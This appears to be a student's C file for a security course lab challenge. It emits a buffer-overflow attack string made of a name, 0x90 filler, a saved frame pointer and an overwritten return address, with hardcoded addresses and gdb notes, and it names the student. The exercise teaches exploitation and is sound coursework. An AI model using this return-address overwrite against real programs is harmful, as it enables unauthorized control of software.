// Jennifer Long
// rz5sc
// CS 4630
// OWL Challenge 1
// attack_spell1.c

#include <stdio.h>
#include <string.h>

///////////////////////////////////////////

// General Idea:
//    1) Change ret addr to pass gateway

// Values:
    // saved ebp: ffffd048, \x48\xd0\xff\xff
    // original return address: 08048522
    // new return address: 08048545, \x45\x85\x04\x08
    // name param addr: 0804a034

// Attack String Components
    // My name + null terminator
    // Filler %x commands (26)
    // saved ebp
    // new ret addr
    // name param addr

// gdb breakpoints: ReadString; end of RS(*0x8048501)

unsigned char attackString[] = {
    'J', 'e', 'n', 'n',
    'i', 'f', 'e', 'r',
    ' ', 'L', 'o', 'n',
    'g', 0x00, 0x90, 0x90,

    0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90,

    0x48, 0xd0, 0xff, 0xff,
    0x45, 0x85, 0x04, 0x08,
    0x34, 0xa0, 0x04, 0x08,
};

int main() {
 int i;
 char *p = attackString;
 for (i = 0; i < sizeof(attackString); i++) {
   putchar(*p);
   p++;
 }
 return 1;
}
